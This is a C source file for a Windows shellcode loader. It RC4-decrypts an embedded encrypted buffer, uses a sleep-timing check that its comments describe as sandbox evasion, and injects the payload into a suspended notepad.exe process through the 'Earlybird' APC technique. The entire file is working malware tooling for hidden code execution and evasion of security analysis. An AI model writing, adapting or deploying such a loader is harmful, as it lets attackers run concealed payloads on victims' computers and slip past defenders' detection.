#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

extern unsigned char buf;
extern unsigned int buf_len;

// RC4 function to decrypt
void rc4(unsigned char* data, int len, const char* key) {
	int keylen = strlen(key);
	unsigned char s[256];
	for (int i = 0; i < 256; i++) {
		s[i] = i;
	}

	unsigned char j = 0;
	for (int i = 0; i < 256; i++) {
		j = (j + s[i] + key[i % keylen]) % 256;
		unsigned char tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}

	int i = 0;
	j = 0;
	for(int n = 0; n < len; n++) {
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		unsigned char tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		data[n] ^= s[(s[i] + s[j]) % 256];
	}
}

// Time compare function and delay to evade sandboxing
int DelayFunction() {
	clock_t start_t, end_t;
	double total_t;
	int i = 10; // Delay of 10 seconds

	start_t = clock();
	Sleep(i * 1000); // Sleep counts in Milliseconds, conversion seconds x 1000)
	end_t = clock();

	if (((double)(end_t - start_t) / CLOCKS_PER_SEC) < i) {
		exit(0);
	}
	total_t = (double)(end_t - start_t) / CLOCKS_PER_SEC;

	return (0);
}

int main() {
	const char* key = "amsi.dll";
	SIZE_T shellSize = buf_len;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	// Simple Sandbox Evasion
	DelayFunction();

	// Earlybird APC Technique
	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;

	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

	// Decrypt before injection and run
	rc4((unsigned char*)&buf, buf_len, key);

	// Activating Earlybird
	WriteProcessMemory(victimProcess, shellAddress, &buf, shellSize, NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
	ResumeThread(threadHandle);

	return 0;
}